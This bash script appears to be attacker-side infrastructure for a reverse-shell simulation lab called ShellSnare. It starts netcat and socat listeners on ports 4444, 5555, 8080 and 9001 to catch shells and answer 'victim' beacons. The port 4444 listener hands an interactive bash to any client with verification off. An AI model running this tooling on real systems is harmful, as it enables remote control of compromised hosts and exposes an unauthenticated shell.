#!/bin/bash
# Attacker: Multi-port listener that accepts connections on 4444, 5555, 8080, 9001
# Uses socat in parallel — runs in background to accept all simulator types

CERT_DIR="/opt/attacker/certs"
CERT_FILE="$CERT_DIR/cert.pem"
KEY_FILE="$CERT_DIR/key.pem"

mkdir -p "$CERT_DIR"
if [ ! -f "$CERT_FILE" ] || [ ! -f "$KEY_FILE" ]; then
    echo "[*] Generating self-signed certificate..."
    openssl req -new -x509 -days 365 -nodes \
        -subj "/CN=attacker" \
        -out "$CERT_FILE" -keyout "$KEY_FILE" 2>/dev/null
fi

echo "[*] Starting ShellSnare multi-listener..."
echo "    - SSL/Socat on port 4444"
echo "    - Python/Netcat on port 9001"
echo "    - PHP/Netcat on port 5555"
echo "    - HTTP shell on port 8080 (nc)"

# Kill any existing listeners
pkill -f "socat OPENSSL-LISTEN" 2>/dev/null || true
pkill -f "nc -lp" 2>/dev/null || true

# SSL listener (port 4444) — SSL reverse shells
socat OPENSSL-LISTEN:4444,reuseaddr,cert="$CERT_FILE",key="$KEY_FILE",verify=0,fork \
    EXEC:'/bin/bash -i',pty,sane &
SSL_PID=$!
echo "[+] SSL listener PID: $SSL_PID"

# Netcat listener (port 9001) — Python & generic shells
nc -lkp 9001 &
NC9001_PID=$!
echo "[+] nc:9001 listener PID: $NC9001_PID"

# Netcat listener (port 5555) — PHP shells
nc -lkp 5555 &
NC5555_PID=$!
echo "[+] nc:5555 listener PID: $NC5555_PID"

# HTTP listener (port 8080) — simple response to HTTP shell beacons
# Responds with 200 OK so the victim's curl doesn't fail
while true; do
    echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nok" | nc -lp 8080 2>/dev/null || true
done &
HTTP_PID=$!
echo "[+] HTTP listener PID: $HTTP_PID"

echo "[*] All listeners ready. Waiting..."
wait
